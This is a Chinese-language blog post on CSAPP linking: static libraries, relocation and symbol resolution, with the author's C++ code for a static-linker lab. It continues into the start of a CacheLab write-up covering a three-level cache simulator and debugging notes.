​\t静态库作为存档（archieve）存放在磁盘中，可以认为是一组可重定位目标文件的集合，当我们自己的编程中引用库时就如下图所示：\n当你引用addvec时，直接复制addvec.o到可执行的文件。\n如何使用静态库解析引用？ # 对于一行编译的命令，linker会从左到右进行扫描，维护三个集合：\n1.E：维护可重定位目标文件的集合\n2.U：未解析的符号的集合\n3.D：前面输入文件的已经定义的符号的集合\nprocess：\n1.扫描过程中，若为一个目标文件f，直接放入E中，并且在U和D中更改元素（比如自己定义的符号就放到D，此时引用的静态库的符号就放到U）。\n2.若f是一个archieve，那么我们将archive中的成员和U中的元素比对，如果定义了，就把这个元素放到D中去。\n3.linker完成之后，|U| ！= 0 ，那么报错中止。\nunix\u0026gt; gcc -static ./libvector.a main2.c /tmp/cc9XH6Rp.o: In function ‘main’: /tmp/cc9XH6Rp.o(.text+0x18): undefined reference to ‘addvec’ 那么考察这样的情况，若你把静态库放到前面，那么开始就会和U中的元素比对，但是此时U中没有元素，当main.c被扫描时，此时它引用的静态库中的函数就会是undefined。\n所以我们要把库放在最后，并且要根据库之间的依赖型进行排序（拓扑排序）。\n如果有更复杂的依赖性问题，就可以多次在命令行上重复库（可以看课后题目）。\n重定位 # 合并输入模块，为每个符号分配运行时地址。\n1.重定位节和符号定义\n​\t比如把所有的.data节合并成一个节并且分配地址。\n2.重定位节中的符号引用\n​\t修改符号引用，使其指向正确的运行时地址。\n重定位条目 # 汇编器生成目标模块时生成.rel.data .rel.text 重定位条目\n重定位符号引用 # 重定位算法遍历每个section和遍历每个条目：\nforeach section s { foreach relocation entry r { refptr = s + r.offset; /* ptr to reference to be relocated */ /* relocate a PC-relative reference */ //相对地址 if (r.type == R_386_PC32) { refaddr = ADDR(s) + r.offset; /* ref’s runtime address */ *refptr = (unsigned) (ADDR(r.symbol) + *refptr - refaddr); } //绝对地址 /* relocate an absolute reference */ if (r.type == R_386_32){ *refptr = (unsigned) (ADDR(r.symbol) + *refptr); } } } 对于上面的main.o 做\nobjdump -dx main.o\nDisassembly of section .text: 0000000000000000 \u0026lt;main\u0026gt;: 0: f3 0f 1e fa endbr64 4: 55 push %rbp 5: 48 89 e5 mov %rsp,%rbp 8: 48 83 ec 10 sub $0x10,%rsp c: be 02 00 00 00 mov $0x2,%esi 11: 48 8d 05 00 00 00 00 lea 0x0(%rip),%rax # 18 \u0026lt;main+0x18\u0026gt; 14: R_X86_64_PC32 array-0x4 18: 48 89 c7 mov %rax,%rdi 1b: e8 00 00 00 00 call 20 \u0026lt;main+0x20\u0026gt; 1c: R_X86_64_PLT32 sum-0x4 20: 89 45 fc mov %eax,-0x4(%rbp) 23: 8b 45 fc mov -0x4(%rbp),%eax 26: c9 leave 27: c3 ret 这是我电脑上实际运行的结果，array和sum都是重定位PC相对引用\n重定位PC相对引用 # 1b: e8 00 00 00 00 call 20 \u0026lt;main+0x20\u0026gt; 观察这一行，e8是call的操作码，后面的00 00 00 00 都是PC相对引用的占位符。\n在重定位时，利用上述的算法，告诉我们sum在main中的偏移量，我们可以在这里调用到sum。\nTODO：具体过程。\n重定位绝对引用 # 在目标文件中直接计算并且更改。\n在我们重定位之后：\n0000000000001129 \u0026lt;main\u0026gt;: 1129: f3 0f 1e fa endbr64 112d: 48 83 ec 08 sub $0x8,%rsp 1131: be 02 00 00 00 mov $0x2,%esi 1136: 48 8d 3d d3 2e 00 00 lea 0x2ed3(%rip),%rdi # 4010 \u0026lt;array\u0026gt; 113d: e8 05 00 00 00 call 1147 \u0026lt;sum\u0026gt; 1142: 48 83 c4 08 add $0x8,%rsp 1146: c3 ret 0000000000001147 \u0026lt;sum\u0026gt;: 1147: f3 0f 1e fa endbr64 114b: ba 00 00 00 00 mov $0x0,%edx 1150: b8 00 00 00 00 mov $0x0,%eax 1155: eb 09 jmp 1160 \u0026lt;sum+0x19\u0026gt; 1157: 48 63 c8 movslq %eax,%rcx 115a: 03 14 8f add (%rdi,%rcx,4),%edx 115d: 83 c0 01 add $0x1,%eax 1160: 39 f0 cmp %esi,%eax 1162: 7c f3 jl 1157 \u0026lt;sum+0x10\u0026gt; 1164: 89 d0 mov %edx,%eax 1166: c3 ret main中113e的位置就是sum的重定位地址\n这里的值5就是重定位的值：当CPU执行call指令时，PC会指向下一条就是1142,为了执行这个指令，CPU把PC放进栈中，并且 PC += 5，也就是PC = 1147，此时，就会执行到sum的代码。\n这个逻辑是和call指令配套的，linker在🔗这两个程序的时候，就会根据重定位表，把e8之后的占位符更改成要调用的函数相对于当前PC的偏移量的大小，call会先将PC压入栈中，PC += offset，接着就会执行到目标函数。\n可执行目标文件 # 我们现在已经合成了这个：\n这是一个典型的格式。\n我们查看一下上面那个a.out的program header\nProgram Header: PHDR off 0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3 filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r-- INTERP off 0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0 filesz 0x000000000000001c memsz 0x000000000000001c flags r-- LOAD off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12 filesz 0x00000000000005f0 memsz 0x00000000000005f0 flags r-- LOAD off 0x0000000000001000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12 filesz 0x0000000000000175 memsz 0x0000000000000175 flags r-x LOAD off 0x0000000000002000 vaddr 0x0000000000002000 paddr 0x0000000000002000 align 2**12 filesz 0x00000000000000d8 memsz 0x00000000000000d8 flags r-- LOAD off 0x0000000000002df0 vaddr 0x0000000000003df0 paddr 0x0000000000003df0 align 2**12 filesz 0x0000000000000228 memsz 0x0000000000000230 flags rw- DYNAMIC off 0x0000000000002e00 vaddr 0x0000000000003e00 paddr 0x0000000000003e00 align 2**3 filesz 0x00000000000001c0 memsz 0x00000000000001c0 flags rw- NOTE off 0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3 filesz 0x0000000000000030 memsz 0x0000000000000030 flags r-- NOTE off 0x0000000000000368 vaddr 0x0000000000000368 paddr 0x0000000000000368 align 2**2 filesz 0x0000000000000044 memsz 0x0000000000000044 flags r-- 0x6474e553 off 0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3 filesz 0x0000000000000030 memsz 0x0000000000000030 flags r-- EH_FRAME off 0x0000000000002004 vaddr 0x0000000000002004 paddr 0x0000000000002004 align 2**2 filesz 0x0000000000000034 memsz 0x0000000000000034 flags r-- STACK off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4 filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw- RELRO off 0x0000000000002df0 vaddr 0x0000000000003df0 paddr 0x0000000000003df0 align 2**0 filesz 0x0000000000000210 memsz 0x0000000000000210 flags r-- 后面的是执行的权限的问题，vaddr是开始的内存地址，memsz是总共的内存大小，off偏移量，我们要满足这样的条件：\n​\tvaddr mod align = off mod align\n这样程序执行的时候，可以有效率的传送到内存，我们会在虚拟内存的章节中学习到。\n加载可执行目标文件 # 我们可能还会有一个关于加载器的实验，继续理解这个过程。\n./prog\n​\t这样我们来运行一个自己写的程序，loader把代码和数据复制到内存中，并且跳转到内存的第一条指令或者入口点，这个复制的过程就叫 加载（Load）。\n​\t每个linux程序都有一个运行时内存映像。\n我们对于加载的描述从概念上来说是正确的，但也不是完全准确，这是有意为之。 要理解加载实际是如何工作的 ，你必须理解进程 、虚拟内存和内存映射的概念，这些我们还没有加以讨论 。在后面笫8章和笫9章中遇到这些概念时 ，我们将重新回到加载的问题上，并逐渐向你揭开它的神秘面纱。\n实验： # 本实验就是模仿ld，写一个静态的linker，类似于linux的ld工具。\n用简单的cpp就可以。\n为什么要linker：为源代码的模块化提供可以相互引用的接口（extern）。\n1.符号解析：为每个外部文件的符号引用找对应的解析。\n2.合并成一个可执行文件。\n3.重定位，修改可执行文件代码，使其指向正确的位置。\nCPU使用PC相对引用访问地址。\n重定位就是在合并之后，在这些空缺的位置填入地址。\n实验框架：\n我们要实现的就是解析和重定位这两个关键过程。\n理解关键的数据结构：\nObjectFile # 用来存储目标文件中所需的信息，其包含的成员变量及其含义如下：\nsymbolTable ：目标文件的符号表，保存其每一个符号（见下文Symbol） relocTable ：目标文件的重定位表，保存其每一个重定位条目（见下文RelocEntry） sections ：目标文件的节表，保存节名string到节的映射（见下文Section） sectionsByIdx ：目标文件的节表，保存节索引index到节指针Section*的映射 baseAddr ：目标文件在内存中的起始地址，详见test0 size ：目标文件的大小 Section # 用来存储目标文件中的一个节，其包含的成员变量及含义如下：\nname ：节名称 type ：节类型，在本实验中略 flags ：节标志，在本实验中略 info ：节附加信息，在本实验中略 index ：节下标 addr ：节的起始地址 off ：节在目标文件中的偏移量 size ：节大小 align ：节在目标文件中的对齐限制 关于type和flags的详细信息可参考[ELF文件的man手册中有关Shdr的部分](https://www.man7.org/linux/man-pages/man5/elf.5.html#:~:text=Section header (Shdr))。\nSymbol # 用来存储目标文件中的一个符号，其包含的成员变量及含义如下：\nname ：符号名称，为string类型。 value ：符号值，表示符号在其所属节中的偏移量。 size ：符号大小，当符号未定义时则为0 type ：符号类型，例如符号是变量还是函数 bind ：符号绑定，例如符号为全局或局部的 visibility ：符号可见性，本实验中略 offset ：符号在目标文件中的偏移量 index ：符号相关节的节头表索引 RelocEntry # 用来存储目标文件中的一个引用产生的重定位条目，其包含的成员变量及含义如下：\nsym ：指向与该重定位条目关联的符号Symbol的指针 name ：重定位条目关联的符号名称，类型为string offset ：重定位条目在节中的偏移量 type ：重定位条目类型 addend ：常量加数，用于计算要存储到可重定位字段中的值 allObject # 用来存储所有目标文件对应的ObjectFile数据结构。\nmergedObject # 所有目标文件合并为一个后对应的ObjectFile。\n对于 绝对重定位（如 R_X86_64_64）：\n结果=符号地址+addend\\text{结果} = \\text{符号地址} + \\text{addend}结果=符号地址+addend\n对于 PC 相对重定位（如 R_X86_64_PC32）：\n结果=符号地址+addend−当前地址\\text{结果} = \\text{符号地址} + \\text{addend} - \\text{当前地址}结果=符号地址+addend−当前地址\n​ 想一想：为什么R_X86_64_32对应的addend为0，而R_X86_64_PC32不是？addend有什么实际意义？\n前面是绝对地址，我们是直接得到的，但是后面是PC相对寻址，也就是说call的时候，是相对于此时的PC的值的偏移量计算的，在找数组中的某个值的时候也非常有用。\n重定位的逻辑： # 说到重定位就要考虑到重定位表的问题，我们要如何利用重定位表修改可执行目标文件中的占位符号（0000）。\n#include \u0026#34;relocation.h\u0026#34; #include \u0026lt;sys/mman.h\u0026gt; // test0和test1都只需要进行重定位即可 // 重定位是加载这个程序之前我要修改值 void handleRela(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObject, ObjectFile \u0026amp;mergedObject, bool isPIE) { /* When there is more than 1 objects, * you need to adjust the offset of each RelocEntry */ // 合并之后，我们要更改偏移量,在大于1的情况下 if (allObject.size() \u0026gt; 1) { // 每次sum都要加上一整个节大小的偏移 uint64_t sum = 0; for (auto \u0026amp;object : allObject) { for (auto \u0026amp;rel : object.relocTable) { rel.offset += sum; } sum += object.sections[\u0026#34;.text\u0026#34;].size; } } /* in PIE executables, user code starts at 0xe9 by .text section */ /* in non-PIE executables, user code starts at 0xe6 by .text section */ // 注意 textOff 和 textAddr 的区别：textOff 是指 .text 节在 ELF 文件中存储的位置，而 textAddr 是指 .text 节被运行时加载后在内存中所处的位置。 // 这里都是mergeObject的位置 uint64_t userCodeStart = isPIE ? 0xe9 : 0xe6; uint64_t textOff = mergedObject.sections[\u0026#34;.text\u0026#34;].off + userCodeStart; uint64_t textAddr = mergedObject.sections[\u0026#34;.text\u0026#34;].addr + userCodeStart; for (auto \u0026amp;object : allObject) { for (auto \u0026amp;rel : object.relocTable) { // 直接转换 uint64_t baseAddr = reinterpret_cast\u0026lt;uint64_t\u0026gt;(mergedObject.baseAddr); // 查看重定位的类型 // 相对寻址 if (rel.type == R_X86_64_PLT32 || rel.type == R_X86_64_PC32) { // 填入目标指令地址和当前PC的差值 + 补偿量 int val = rel.sym-\u0026gt;value - (textAddr + rel.offset) + rel.addend; // 注意这里的地址是32位的地址 *reinterpret_cast\u0026lt;int *\u0026gt;(baseAddr + textOff + rel.offset) = val; } // 这是绝对地址 else if (rel.type == R_X86_64_32) { int val = rel.sym-\u0026gt;value + rel.addend; *reinterpret_cast\u0026lt;int *\u0026gt;(baseAddr + textOff + rel.offset) = val; } else { fprintf(stderr, \u0026#34;There is something wrong...\\n\u0026#34;); } } } } 符号解析的逻辑： # 这和之前我们讨论库是怎么加载的是类似的，我们维护集合。\n看了别人的代码，为了防止有抄袭的风险，我就有部分写的比较抽象。\n#include \u0026#34;resolve.h\u0026#34; #include \u0026lt;iostream\u0026gt; #define FOUND_ALL_DEF 0 #define MULTI_DEF 1 #define NO_DEF 2 std::string errSymName; int callResolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects); void resolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects) { int ret = callResolveSymbols(allObjects); if (ret == MULTI_DEF) { std::cerr \u0026lt;\u0026lt; \u0026#34;multiple definition for symbol \u0026#34; \u0026lt;\u0026lt; errSymName \u0026lt;\u0026lt; std::endl; abort(); } else if (ret == NO_DEF) { std::cerr \u0026lt;\u0026lt; \u0026#34;undefined reference for symbol \u0026#34; \u0026lt;\u0026lt; errSymName \u0026lt;\u0026lt; std::endl; abort(); } } /* bind each undefined reference (reloc entry) to the exact valid symbol table entry * Throw correct errors when a reference is not bound to definition, * or there is more than one definition. */ // 这里我们要做三件事情1.找未定义的符号2.多重定义3.把弱符号绑定到强符号上面去 int callResolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects) { // if found multiple definition, set the errSymName to problematic symbol name and return MULTIDEF; // if no definition is found, set the errSymName to problematic symbol name and return NODEF; // 维护两个集合，strong和weak // 前面是name，后面是对应的*symbol std::unordered_map\u0026lt;std::string, Symbol *\u0026gt; weakMap; std::unordered_map\u0026lt;std::string, Symbol *\u0026gt; strongMap; for (auto \u0026amp;object : allObjects) { // 遍历符号表 for (auto \u0026amp;symbol : object.symbolTable) { // 找到了一个强符号 if (symbol.index != SHN_UNDEF \u0026amp;\u0026amp; symbol.index != SHN_COMMON \u0026amp;\u0026amp; symbol.bind == STB_GLOBAL) { // 已经存在，表明多重定义 if (strongMap.find(symbol.name) != strongMap.end()) { errSymName = symbol.name; return MULTI_DEF; } else { // 原来没有，直接绑定 strongMap.emplace(symbol.name, \u0026amp;symbol); } } } } // 把所有强符号绑定好了之后，再去处理弱符号 for (auto \u0026amp;object : allObjects) { for (auto \u0026amp;symbol : object.symbolTable) { if (symbol.index == SHN_COMMON \u0026amp;\u0026amp; symbol.bind == STB_GLOBAL) { // 不存在直接绑定 if (weakMap.find(symbol.name) == weakMap.end()) { weakMap.emplace(symbol.name, \u0026amp;symbol); } } } } // 处理弱符号和强符号相同的情况 for (auto it = weakMap.begin(); it != weakMap.end(); ++it) { if (strongMap.find(it-\u0026gt;first) != strongMap.end()) { it-\u0026gt;second-\u0026gt;value = strongMap[it-\u0026gt;first]-\u0026gt;value; it-\u0026gt;second-\u0026gt;index = strongMap[it-\u0026gt;first]-\u0026gt;index; } } // 遍历重定位符号表，哪些符号要重定位但是没有在map里，说明未定义的错误 // 重定位的symbol在最后检查的时候被绑定 for (auto \u0026amp;object : allObjects) { for (auto \u0026amp;rel : object.relocTable) { if (strongMap.find(rel.name) != strongMap.end()) { rel.sym = strongMap[rel.name]; } else if (weakMap.find(rel.name) != weakMap.end()) { rel.sym = weakMap[rel.name]; } else { errSymName = rel.name; return NO_DEF; } } } return FOUND_ALL_DEF; } 总之，链接是一个复杂的话题，牵扯的知识很多且杂，还有动态DLL，库打桩机制等内容，之后再做了解。\n","date":"19 April 2025","externalUrl":null,"permalink":"/csapp/csapplinkerlab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:LinkerLab \n    \u003cdiv id=\"csapplinkerlab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csapplinkerlab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCSAPP上关于链接的知识我也会放在这里\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e本文图片大多来源于英文原版CSAPP。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e链接机制详解 \n    \u003cdiv id=\"%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e有多详细？这很难定义吧，是否详细应当取决于读者本来的理解,linking本身就是看起来好像就是打包一下很简单的东西，但是涉及到的知识比较复杂，应用也相当广泛。\u003c/p\u003e","title":"CSAPP:LinkerLab","type":"csapp"},{"content":" CSAPP:CacheLab # 本次lab分为A和B两部分，我先看情况做，并且会部分引用我校助教撰写的一些内容以及思考题，首先我们要熟悉一下Cache的工作原理，关于这一部分的内容，你也可以看我的ComputerOrgnization中的内容（写的不怎么样，你最好还是看课本，而且我还建议你做一下课本上的习题），A部分是实现一个3级Cache，实现的过程中我们应当会对Cache的工作原理更加熟悉，B部分是优化矩阵转置函数，我认为会教会我们什么是Cahce友好的代码。\n注意：以下不会从零开始讲述Cache的知识，并且不要抄袭，不要抄袭，不要抄袭。\nCache:计算机的世界无处不在的伟大思想\u0026hellip;\u0026hellip;\n熟悉：\nCacheLine的组织方式 # 可以看成是一个元素是CacheLine的二维数组。\nE = 1:直接映射\nS = 1：全相联映射\n处理写操作的方法 # cache处理写操作的流程比读取要复杂，因为写入操作涉及数据的更改，一旦涉及修改操作，就会带来各种一致性问题，因此cache需要合理的处理数据更改的时机和范围。同时还需要处理写miss的情况。我们在这里简要介绍一下有关写cache的一些问题和处理机制。\n一般而言，对于写入操作，cache一般有两种处理机制，分别是：\nwrite back（写回）：即数据的修改只发生在当前这一级cache中，通常会引入一个dirty标记位，表示cache中的数据和下一级cache（或内存）中的数据不一致，只有在当前的cacheline被evict的时候才会将数据写回到下一级cache（或内存）。 write through（写直达）：顾名思义，写入操作会同时将数据写入到当前cache和下一级cache（或内存中），因此二者的数据是同步的。 除了上述的两种策略，cache还需要确定如何处理write miss的情况，一般而言，也有两种方法：\nwrite allocate（写分配）：当发生cache miss时，需要访问下一级cache（或内存）将需要的cache line加载到当前cache中，然后再修改这个cache line中的内容 no write allocate（写不分配）：当发生cache miss时，无需修改当前cache中的内容，直接写入下一级cache（或内存） 上述策略两两组合可以产生4种不同的写策略，但是一般常见的只有以下两种：\nwrite back/write allocate：即写回+写分配策略（图片来自wiki）\nwrite through/no write allocate：即写直达+写不分配策略\nQ：为什么没有写回和写不分配的操作？\nA：试想一下这样的情况：有二级缓存L1和L2,我们在L1写某个内存时发生了CacheMiss，假如我们写这个的概率很高，那么这块内存应该加载到L1才更加合理，但是每次都会发生CacheMiss，这不符合时间局部性的要求。另外一种方式也可以这样思考一下。\n多级cache的包含准则(inclusion policy) # 这是本Lab的重中之重，请务必仔细理解。\n包含性策略：更高层次的，访问速度更快的cache包含的内容是下层cache的一个子集。\n现代处理器中的 L1 和 L2 Cache 可能采用不同的 一致性策略，主要有：\n包容式（Inclusive）Cache：L2 必须包含 L1 中的所有数据。 非包容式（Non-Inclusive）Cache：L1 和 L2 不必强制包含相同数据，可以各自缓存不同的数据。 独占式（Exclusive）Cache：L1 和 L2 不共享数据，数据只存在一个层级。 如上图的一个模拟情况：\n多余不再赘述，我们只需要注意这样两点：\n1.上层的存储不断Cache Miss时，直到找到没有Cache Miss的这样一层，接着要把这个数据加载到之前Cache Miss的每一层。\n2.当下层的存储发生Cache Evict时，我们要把这一层之上的所有这个数据置为无效，显然，对于Inclusive Policy，如果不驱逐就不满足子集条件。\n三级Cache模拟器 # 我们要实现这样一个Cache：\nL1分为L1D（数据读写）和L1I（指令读取）两个分离的cache，并且L1I是只读的。\nL1和L2为每个核心私有\nL2为unfied cache，也就是会同时存储指令和数据\nL3为unfied cache，且所有核心共享\n每个Cache的具体配置，方便查阅：\n每个cache的具体配置如下：\nL1D(I) cache size: 64B set: 4 associativity: 2-way cache line size: 8B write policy: write back + write allocate L2 cache size: 256B set: 8 associativity: 4-way cache line size: 8B write poliy: write back + write allocate inclusion policy: inclusive L3 cache size: 2KB set: 16 associativity: 8-way cache line size: 16B write policy: write back + write allocate inclusion policy: inclusive 我们实现单核的CPU中的缓存机制，不考虑并发访问和与核心的缓存一致性问题。\n小小吐槽一下：我们学校的助教简直已经把lab喂到嘴里了，把一整个lab变成了leetcode一样的核心代码模式，这样不好，但是门槛会变低。\n（对不起，误会了，还是挺难的\u0026hellip;\u0026hellip;）\n先读一下定义的头文件：\n/* * cachelab.h - Prototypes for Cache Lab helper functions */ #ifndef CACHE_LAB_H #define CACHE_LAB_H #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define L1_SET_NUM 4 #define L1_LINE_NUM 2 #define L1_CACHELINE_SIZE 8 #define L2_SET_NUM 8 #define L2_LINE_NUM 4 #define L2_CACHELINE_SIZE 8 #define L3_SET_NUM 16 #define L3_LINE_NUM 8 #define L3_CACHELINE_SIZE 16 #define ADDRESS_LENGTH 64 #define MAX_TRANS_FUNCS 100 //核心的CacheLine是一个结构体 typedef struct { bool valid; bool dirty; uint64_t tag; uint64_t latest_used; // for LRU } CacheLine; typedef struct trans_func { void (*func_ptr)(int M, int N, int[N][M], int[M][N]); char *description; char correct; unsigned int num_hits; unsigned int num_misses; unsigned int num_evictions; } trans_func_t; // defined in csim.c extern CacheLine l1dcache[L1_SET_NUM][L1_LINE_NUM]; // L1 Instruction Cache extern CacheLine l1icache[L1_SET_NUM][L1_LINE_NUM]; // L2 Unified Cache extern CacheLine l2ucache[L2_SET_NUM][L2_LINE_NUM]; // L2 Unified Cache extern CacheLine l3ucache[L3_SET_NUM][L3_LINE_NUM]; /* Fill the matrix with data */ void initMatrix(int M, int N, int A[N][M], int B[M][N]); /* The baseline trans function that produces correct results. */ void correctTrans(int M, int N, int A[N][M], int B[M][N]); /* Add the given function to the function list */ void registerTransFunction(void (*trans)(int M, int N, int[N][M], int[M][N]), char *desc); #endif 实现的时候我们按照如下的顺序（程序框图,假设我们在访问第i级Cache）：\n根据内存地址得到相应的tag，set字段的值 检查第 i 级cache是否命中 如果命中，跳到第8步 否则，继续访问下一级cache（或内存）获取数据 在本级cache对应的set中找一个invalid的cache line，用于放置从下一级cache（或内存）加载的cache line，如果有多个invalid的cache line，选择下标最小的一个，然后跳到第8步 如果在第5步对应的set已满，你需要首先evict一个cache line，evict的过程使用LRU算法，如果evict的cache line是dirty的，你需要首先将其写入到下一级缓存（或内存） 由于inclusive policy，你可能需要back invalidation第 i - 1 级cache中的cache line 设置这个cache line对应的tag字段，LRU字段和valid字段 如果访问模式是写操作，设置dirty字段 返回 给了我们一个例子，我来看看\u0026hellip;\u0026hellip;\ncache的访问trace依次为：\nRead a Read b Read a Write b Read c Write a Read d Read c Write b Write c Read e Read f Read b Read d 画一画吧，这个还是挺复杂的，最复杂的地方就在于驱逐的时候Back Invalidation的逻辑。\n助教给出的一些注意事项：\n在访问cache之前，你需要正确的初始化所有的cache line, 换句话说，你需要把所有的字段全部初始化为0\n你可以假设，对于单个cache的访问，不会出现跨两个cache line的情况，换句话说，你可以忽略cacheAccess函数中的第三个参数\n对于M类型的访问，你可以等价的将他看作为一次读取和一次写入\n需要注意的是，L2和L3 cache会同时包含指令和数据\n你可以假设指令和数据不会访问同一块内存，换句话说，你可以假设L2中的某个cache line不会同时出现在L1D cache和L1I cache中\n这里TMD是这样的么，我假设访问一块内存之后就过了一堆样例（也有可能是我误人子弟了。。。。。。）\n本次实验仅要求模拟cache访问，因此你无需关心具体的写入数据\n你可以使用位运算相关技巧从传入的地址中提取出tag，set，block等信息\n你可以使用位运算相关技巧根据tag，set，block的信息拼接出内存地址\n在加载一条cache line时，你需要在当前cache set中找出一条可用的cache line, 换句话说，你需要找到一条valid字段为false的cache line。如果有多条可用的cache line，你需要选择下标最小的一个\n你需要严格使用LRU算法来找到需要evict的cache line\n你可以简单使用循环的方式来暴力实现LRU，而不考虑复杂度的问题，为此，你可以维护一个全局时钟并且仔细的设置cache line结构中的latest_used字段\n在evict一条cache line时，你需要考虑dirty字段的影响，换句话说，如果dirty为true，你需要在加载新的cache line之前，将旧的cache line写回到下一级cache（或内存）。如果dirty为false，你可以简单的将这条cache line丢弃\n你在进行evict的时候，无需对evict的cache line的LRU字段进行改动\n你需要在每次成功访问一条cache line之后设置LRU字段，成功访问指写入/读取命中，或者是从下级缓存加载了相应的cache line之后的读取/写入操作\n在发生conflict miss时，你需要严格遵守先fetch，后evict的过程，即先访问下一级缓存或者内存得到数据所在的cache line，再选择需要evict的cache line，这可能会影响LRU设置的顺序。考虑一个例子，假如某个时刻全局时钟为10，L1发生conflict miss，L2 hit，你需要首先访问L2，由于L2 hit，设置L2中对应的cache line的LRU为10，然后将cache line返回给L1，假设L1需要evict的cache line是dirty的，你需要将其首先写回L2，这是100% hit的（为什么？），因此设置L2中对应的cache line的LRU为11，最后将需要的cache line放置在L1经evict空出的位置上，然后设置对应的LRU为12\n本次实验要求上一级cache的内容一定存在于下一级cache中，这叫做inclusive policy。你需要时刻保证这一条性质，并且好好利用它\n受限于inclusive policy，写回脏数据的过程实际上是100% hit的，你需要合理的安排代码顺序实现这一点\n当你处理write miss时，需要首先访问下一级缓存（或者内存）获取cache line，然后再写入这条cache line。在此过程中，你需要仔细思考对于下一级缓存应该以什么类型进行访问\n如果你需要从L2 evict某个cache line，假设这个cache line也存在于L1, 你需要将L1中对应的cache line也进行evict，这个过程叫做back invalidation。如果L1中的数据是dirty的，你需要首先将其写回L2。\n如果你需要从L3 evict一个cache line，你也需要分别将L1和L2中对应的cache line进行evict。在此过程中，你需要好好思考evict的顺序，以保证inclusive的性质。\n注意，不同级别的缓存cache line的大小可能是不一样，你在设计代码的时候需要考虑这会产生哪些影响，并仔细的处理相关流程\nvscode ctrl + shift + I整理代码\n我草，debug快疯了\u0026hellip;\u0026hellip;（debug日记）\n//分析一下错误 Testcase Lines Result Random Score --------------------------------------------------------------------------------- traces-data-intensive/long.trace 267988 FAIL IGNORE 0/3 Details for trace \u0026lt;traces-data-intensive/long.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 231249 55715 53833 230444 56520 53285 L1 I 0 0 0 0 0 0 L2 46998 26645 26424 47391 27797 24629 L3 32061 10181 10053 33435 11645 11517 hits 和 misses的和相等，但是差刚好差了805,hits多了，misses少了，随之evict也会变多，这应该不是计数而是逻辑的问题\nraces-basic/mixed-2.trace 90 FAIL IGNORE 0/5 Details for trace \u0026lt;traces-basic/mixed-2.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 20 60 52 20 60 52 L1 I 18 12 7 17 13 6 L2 71 43 15 71 44 16 L3 19 28 0 21 28 0 为什么I指令自己没错，分开都没错，但是结合到一起就出错了,两者之间为什么会相互影响？？？\ntraces-hard/grep.trace 406467 FAIL IGNORE 0/1 Details for trace \u0026lt;traces-hard/grep.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 37304 1068 949 22544 15828 502 L1 I 184075 184064 184034 184075 184064 184016 L2 176099 9087 9055 118023 81983 81951 L3 6693 2413 2285 79669 2416 2288 L3hits之间差距过大,L2中的数据没有及时驱逐？？？\n先放这，休息一下再看。\n已经拿了76分，但实在是很难找到剩下的逻辑错误！煎熬！\nOK，最后拿了93分，差一点点实在是找不出来为啥了,不贴源代码了，写了六七百行能跑的垃圾，之后再精简总结一下,这下是真尽力了，我感觉已经不是一个设计的问题了，到最后我甚至要去猜哪里的设计提示是不是说的有问题，有错误，那就没有意思了对么\u0026hellip;\u0026hellip;\n最后应该是因为三层地址中block位并不一样的原因，这里要细节处理一下，因为你直接把L3的block干成0,可能会对于L2的setIndex位产生影响。\n我放代码：\n1.我写的代码很垃圾，放的没有意义（主要是时间很紧张，压缩一下应该能在300行左右）。\n2.维护学术诚信。\n关于Cache的一些思考 # 也不算很深，进一步探究一下，以下都是我自己或者问gpt得到的观点，自己的一些看法，如果您对于某个问题有着更好的理解，欢迎在评论区指出来，这里我说的低级cache或者下层的cache指的是靠近内存的cache。\n1. # 在这个实验中一直强调的一个点是Inclusive policy，这种设计方法在以前的CPU，特别是Intel的CPU中很常见，但其实现代的CPU以及逐渐转向使用NINE模式，因此会产生以下问题：\n使用Inclusive policy的缓存必须满足什么条件？这样设计的优缺点分别是什么？\n​\t底层缓存必须包含上层的缓存，在底层缓存驱逐的时候要做back 